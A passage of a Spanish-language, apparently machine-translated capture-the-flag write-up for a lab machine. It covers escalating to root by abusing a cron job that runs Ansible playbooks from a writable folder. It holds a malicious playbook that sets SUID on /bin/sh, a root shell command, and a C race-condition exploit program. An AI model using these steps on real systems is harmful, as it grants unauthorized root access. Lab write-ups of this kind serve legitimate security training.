<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># phil@inject (bash)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">chmod</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +x</span><span style="color:#B56959;--shiki-dark:#C3E88D"> pspy</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;&amp;</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> ./pspy</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> tee</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -a</span><span style="color:#B56959;--shiki-dark:#C3E88D"> pspy.log</span></span></code></pre> 
<p>Después de un par de minutos, encontramos una serie de procesos privilegiados que se ejecutan cada dos minutos y que interactúan con /opt/automation/tasks de una manera potencialmente insegura.</p>
<ul>
<li>/usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml</li>
<li>/usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml</li>
<li>sleep 10</li>
<li>/usr/bin/rm -rf /opt/automation/tasks/*</li>
<li>/usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/</li>
</ul>
<p>El primer proceso en cuestión evalúa cualquier ruta que satisfaga /opt/automation/tasks/*.yml como un playbook de Ansible. Deberíamos ser capaces de conseguir nuestro libro de jugadas evaluado desde /opt/automation/tasks es escribible.</p>
<h2 id="ansible">Ansible</h2>
<p>Resulta que, la ejecución de comandos en un libro de jugadas Ansible es posible y bien documentado, lo que significa que debe ser capaz de escalar a la raíz de esta manera. Vamos a añadir una tarea que concederá el bit SUID a /bin/sh, asegurándose de que limpiar después de nosotros mismos para no arruinar la caja para los demás.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">-</span><span style="color:#B56959;--shiki-dark:#C3E88D"> hosts:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> localhost</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  tasks:</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  -</span><span style="color:#B56959;--shiki-dark:#C3E88D"> name:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> pwn</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    ansible.builtin.shell:</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">chmod +s /bin/sh</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># phil@inject (bash)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">cat</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &lt;&lt;</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> EOF</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> /opt/automation/tasks/pwnbook.yml</span></span>
<span class="line"><span style="color:#B56959;--shiki-dark:#C3E88D">- hosts: localhost</span></span>
<span class="line"><span style="color:#B56959;--shiki-dark:#C3E88D">  tasks:</span></span>
<span class="line"><span style="color:#B56959;--shiki-dark:#C3E88D">  - name: pwn</span></span>
<span class="line"><span style="color:#B56959;--shiki-dark:#C3E88D">    ansible.builtin.shell: chmod +s /bin/sh</span></span>
<span class="line"><span style="color:#B5695999;--shiki-dark:#89DDFF">EOF</span></span></code></pre> 
<p>Después de un par de minutos verificamos que /bin/sh o /bin/dash tienen SUID, y luego generamos un shell de root.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># phil@inject (bash)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">/bin/sh</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -pi</span></span></code></pre> 
<h1 id="alternative-solution-bonus">Alternative Solution (Bonus)</h1>
<p>Imaginemos que el comodín mágico utilizado para ejecutar nuestro propio libro de jugadas no existiera. Incluso sin esto, podemos resolver esta máquina abusando de una condición de carrera en un trabajo CRON. Mira, cada dos minutos root evalúa el playbook en /opt/automation/tasks/playbook_1.ym junto con el siguiente comando:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">sleep</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;&amp;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  rm</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -rf</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /opt/automation/tasks/</span><span style="color:#A65E2B;--shiki-dark:#BABED8">*</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;&amp;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  cp</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /root/playbook_1.yml</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /opt/automation/tasks/</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B"> gantt</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  dateFormat</span><span style="color:#B56959;--shiki-dark:#C3E88D"> mm:ss</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  axisFormat</span><span style="color:#B56959;--shiki-dark:#C3E88D"> %M:%S</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  tickInterval</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2</span><span style="color:#B56959;--shiki-dark:#C3E88D">minute</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  title</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Process</span><span style="color:#B56959;--shiki-dark:#C3E88D"> creation</span><span style="color:#B56959;--shiki-dark:#C3E88D"> flow</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  section</span><span style="color:#B56959;--shiki-dark:#C3E88D"> CRON</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Job</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  Run</span><span style="color:#B56959;--shiki-dark:#C3E88D"> playbook</span><span style="color:#B56959;--shiki-dark:#C3E88D"> :</span><span style="color:#B56959;--shiki-dark:#C3E88D"> crit,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> milestone,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> p1,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 00</span><span style="color:#B56959;--shiki-dark:#C3E88D">:00,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0</span><span style="color:#B56959;--shiki-dark:#C3E88D">s</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  Sleep</span><span style="color:#B56959;--shiki-dark:#C3E88D"> :</span><span style="color:#B56959;--shiki-dark:#C3E88D"> p2,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 00</span><span style="color:#B56959;--shiki-dark:#C3E88D">:00,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10</span><span style="color:#B56959;--shiki-dark:#C3E88D">s</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  Remove</span><span style="color:#B56959;--shiki-dark:#C3E88D"> playbooks</span><span style="color:#B56959;--shiki-dark:#C3E88D"> :</span><span style="color:#B56959;--shiki-dark:#C3E88D"> milestone,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> p3,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 00</span><span style="color:#B56959;--shiki-dark:#C3E88D">:10,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0</span><span style="color:#B56959;--shiki-dark:#C3E88D">s</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  Copy</span><span style="color:#B56959;--shiki-dark:#C3E88D"> original</span><span style="color:#B56959;--shiki-dark:#C3E88D"> playbook</span><span style="color:#B56959;--shiki-dark:#C3E88D"> to</span><span style="color:#B56959;--shiki-dark:#C3E88D"> tasks</span><span style="color:#B56959;--shiki-dark:#C3E88D"> folder</span><span style="color:#B56959;--shiki-dark:#C3E88D"> :</span><span style="color:#B56959;--shiki-dark:#C3E88D"> milestone,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> p4,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 00</span><span style="color:#B56959;--shiki-dark:#C3E88D">:10,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0</span><span style="color:#B56959;--shiki-dark:#C3E88D">s</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  CRON</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Wait</span><span style="color:#B56959;--shiki-dark:#C3E88D"> :</span><span style="color:#B56959;--shiki-dark:#C3E88D"> w,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 00</span><span style="color:#B56959;--shiki-dark:#C3E88D">:00,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2</span><span style="color:#B56959;--shiki-dark:#C3E88D">m</span></span></code></pre> 
<p>Si observamos la temporización de las llamadas en nuestro registro de PSpy, nos damos cuenta de que el libro de jugadas original se elimina y se sustituye en menos de un segundo. Resulta que podemos utilizar el tiempo entre estas acciones para evitar por completo que el playbook sea reemplazado. Para ello, creamos un directorio en /opt/automation/tasks/playbook_1.ym mientras que la ruta no se reclama. Cuando la tarea intenta rellenar esa ruta, se encuentra con un error, ya que un archivo no puede sobrescribir un directorio, independientemente de los permisos que tenga. Una vez que el comando cp falla, eliminaremos el directorio y lo reemplazaremos con nuestro playbook malicioso, que se evaluará después de un par de minutos.</p>
<p>Sólo necesitamos crear un programa compilado rápido que sea lo suficientemente eficiente para cronometrar esto correctamente. El siguiente programa debería funcionar bien:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">//</span><span style="color:#B56959;--shiki-dark:#C3E88D"> gcc</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -static</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ./privesc2.c</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -o</span><span style="color:#B56959;--shiki-dark:#C3E88D"> privesc2</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic">#include &lt;stdio.h&gt;</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic">#include &lt;stdlib.h&gt;</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic">#include &lt;unistd.h&gt;</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic">#include &lt;sys/stat.h&gt;</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic">#include &lt;sys/types.h&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic">#define PLAYBOOK_PATH &quot;/opt/automation/tasks/playbook_1.yml&quot;</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic">#define PLAYBOOK &quot;- hosts: localhost\n&quot;\</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">                 &quot;  tasks:\n&quot;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">\</span></span>
<span class="line"><span style="color:#B5695999;--shiki-dark:#89DDFF">                 &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">  - name: pwn\n</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#BABED8">\</span></span>
<span class="line"><span style="color:#B5695999;--shiki-dark:#89DDFF">                 &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">    ansible.builtin.shell: chmod +s /bin/sh\n</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">void</span><span style="color:#B56959;--shiki-dark:#C3E88D"> replace</span><span style="color:#999999;--shiki-dark:#89DDFF">()</span><span style="color:#B56959;--shiki-dark:#C3E88D"> {</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  struct</span><span style="color:#B56959;--shiki-dark:#C3E88D"> stat</span><span style="color:#B56959;--shiki-dark:#C3E88D"> sb</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">  while</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">1</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#999999;--shiki-dark:#89DDFF"> {</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">    if</span><span style="color:#999999;--shiki-dark:#89DDFF"> (</span><span style="color:#998418;--shiki-dark:#82AAFF">stat</span><span style="color:#393A34;--shiki-dark:#BABED8">(PLAYBOOK_PATH, </span><span style="color:#999999;--shiki-dark:#89DDFF">&amp;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">sb</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> !</span><span style="color:#393A34;--shiki-dark:#BABED8">= </span><span style="color:#2F798A;--shiki-dark:#F78C6C">0</span><span style="color:#393A34;--shiki-dark:#BABED8">) </span><span style="color:#999999;--shiki-dark:#89DDFF">{</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">      if</span><span style="color:#999999;--shiki-dark:#89DDFF"> (</span><span style="color:#59873A;--shiki-dark:#FFCB6B">mkdir(PLAYBOOK_PATH,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0700</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#393A34;--shiki-dark:#BABED8"> == 0) </span><span style="color:#999999;--shiki-dark:#89DDFF">{</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">        puts(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">&quot;Swapped with directory!&quot;</span><span style="color:#393A34;--shiki-dark:#BABED8">)</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">        return</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">      }</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">      puts(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">&quot;Fail!&quot;</span><span style="color:#393A34;--shiki-dark:#BABED8">)</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">      sleep(110</span><span style="color:#393A34;--shiki-dark:#BABED8">)</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">    }</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    usleep(100</span><span style="color:#393A34;--shiki-dark:#BABED8">)</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">  }</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">void</span><span style="color:#B56959;--shiki-dark:#C3E88D"> plant</span><span style="color:#999999;--shiki-dark:#89DDFF">()</span><span style="color:#B56959;--shiki-dark:#C3E88D"> {</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  FILE</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> *</span><span style="color:#B56959;--shiki-dark:#C3E88D">file</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">  if</span><span style="color:#999999;--shiki-dark:#89DDFF"> (</span><span style="color:#59873A;--shiki-dark:#FFCB6B">file</span><span style="color:#B56959;--shiki-dark:#C3E88D"> =</span><span style="color:#B56959;--shiki-dark:#C3E88D"> fopen</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">PLAYBOOK_PATH,</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">w</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">))</span><span style="color:#999999;--shiki-dark:#89DDFF"> {</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    fprintf(file,</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">%s</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> PLAYBOOK</span><span style="color:#393A34;--shiki-dark:#BABED8">)</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    fclose(file</span><span style="color:#393A34;--shiki-dark:#BABED8">)</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">  }</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">int</span><span style="color:#B56959;--shiki-dark:#C3E88D"> main</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">int</span><span style="color:#B56959;--shiki-dark:#C3E88D"> argc,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> char</span><span style="color:#A65E2B;--shiki-dark:#BABED8">*</span><span style="color:#B56959;--shiki-dark:#C3E88D"> argv[]</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#B56959;--shiki-dark:#C3E88D"> {</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#82AAFF">  replace</span><span style="color:#999999;--shiki-dark:#89DDFF">();</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  sleep(10</span><span style="color:#393A34;--shiki-dark:#BABED8">)</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  system(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">&quot;rm -rf /opt/automation/tasks/playbook_1.yml&quot;</span><span style="color:#393A34;--shiki-dark:#BABED8">)</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#82AAFF">  plant</span><span style="color:#999999;--shiki-dark:#89DDFF">();</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  puts(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">&quot;Done!&quot;</span><span style="color:#393A34;--shiki-dark:#BABED8">)</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">  return</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">}</span></span></code></pre> 
